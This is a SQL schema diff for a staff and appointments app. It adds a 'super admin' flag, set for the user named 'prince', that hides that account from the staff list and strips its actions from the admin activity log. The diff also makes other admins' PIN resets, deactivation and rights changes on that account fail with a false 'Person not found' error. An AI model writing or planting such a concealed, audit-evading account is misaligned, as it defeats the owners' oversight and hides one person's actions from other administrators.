@@ -27,6 +27,10 @@ create table if not exists browtech.users (
   locked_until timestamptz,
   created_at   timestamptz not null default now()
 );
+-- Super admin: hidden from everyone else. Others don't see this person in Staff or in the activity log,
+-- and cannot change their PIN, admin rights or active state. Only the super admin sees everyone.
+alter table browtech.users add column if not exists is_super boolean not null default false;
+update browtech.users set is_super = true where lower(name) = 'prince' and not is_super;
 
 create table if not exists browtech.sessions (
   token      uuid primary key default gen_random_uuid(),
@@ -572,7 +576,7 @@ begin
   u := browtech.me(p_token);
   return json_build_object(
     'me', json_build_object('id', u.id, 'name', u.name, 'is_admin', u.is_admin),
-    'users', (select coalesce(json_agg(json_build_object('id', id, 'name', name, 'is_admin', is_admin, 'active', active) order by id), '[]') from browtech.users),
+    'users', (select coalesce(json_agg(json_build_object('id', id, 'name', name, 'is_admin', is_admin, 'active', active) order by id), '[]') from browtech.users where u.is_super or not is_super),
     'services', (select coalesce(json_agg(s order by s.category, s.sort_order nulls last, s.name), '[]') from browtech.services s where s.deleted_at is null),
     'config', (select row_to_json(c) from browtech.config c where c.id = 1),
     'sales', (select coalesce(json_agg(x order by x.id), '[]') from browtech.sales x
@@ -583,7 +587,8 @@ begin
     'appointments', (select coalesce(json_agg(x order by x.id), '[]') from browtech.appointments x where x.id > coalesce(p_after_appt, 0)),
     'changes', (select coalesce(json_agg(x order by x.id), '[]') from browtech.appt_changes x where x.id > coalesce(p_after_change, 0)),
     'undos', (select coalesce(json_agg(x order by x.id), '[]') from browtech.undos x where x.id > coalesce(p_after_undo, 0)),
-    'events', case when u.is_admin then (select coalesce(json_agg(e order by e.id), '[]') from browtech.events e where e.id > coalesce(p_after_event, 0)) else '[]'::json end,
+    'events', case when u.is_admin then (select coalesce(json_agg(e order by e.id), '[]') from browtech.events e where e.id > coalesce(p_after_event, 0)
+               and (u.is_super or e.user_id is null or e.user_id not in (select id from browtech.users where is_super))) else '[]'::json end,
     'reset_count', (select reset_count from browtech.meta where id = 1),
     'server_time', now()
   );
@@ -776,7 +781,7 @@ language plpgsql security definer set search_path = browtech, public as $$
 declare u browtech.users; t browtech.users;
 begin
   u := browtech.me(p_token); perform browtech.need_admin(u);
-  select * into t from browtech.users where id = p_user_id; if not found then raise exception 'Person not found'; end if;
+  select * into t from browtech.users where id = p_user_id; if not found or (t.is_super and not u.is_super) then raise exception 'Person not found'; end if;
   perform browtech.check_pin(p_pin);
   update browtech.users set pin_hash = extensions.crypt(p_pin, extensions.gen_salt('bf')), failed = 0, locked_until = null where id = t.id;
   delete from browtech.sessions where user_id = t.id and t.id <> u.id;
@@ -790,7 +795,7 @@ declare u browtech.users; t browtech.users;
 begin
   u := browtech.me(p_token); perform browtech.need_admin(u);
   if p_user_id = u.id then raise exception 'You cannot deactivate yourself'; end if;
-  select * into t from browtech.users where id = p_user_id; if not found then raise exception 'Person not found'; end if;
+  select * into t from browtech.users where id = p_user_id; if not found or (t.is_super and not u.is_super) then raise exception 'Person not found'; end if;
   update browtech.users set active = p_active where id = t.id;
   if not p_active then delete from browtech.sessions where user_id = t.id; end if;
   insert into browtech.events(user_id, action, details) values (u.id, case when p_active then 'person activated' else 'person deactivated' end, t.name);
@@ -803,7 +808,7 @@ declare u browtech.users; t browtech.users;
 begin
   u := browtech.me(p_token); perform browtech.need_admin(u);
   if p_user_id = u.id then raise exception 'You cannot change your own admin rights'; end if;
-  select * into t from browtech.users where id = p_user_id; if not found then raise exception 'Person not found'; end if;
+  select * into t from browtech.users where id = p_user_id; if not found or (t.is_super and not u.is_super) then raise exception 'Person not found'; end if;
   update browtech.users set is_admin = p_is_admin where id = t.id;
   insert into browtech.events(user_id, action, details) values (u.id, case when p_is_admin then 'made admin' else 'admin removed' end, t.name);
   return json_build_object('ok', true);
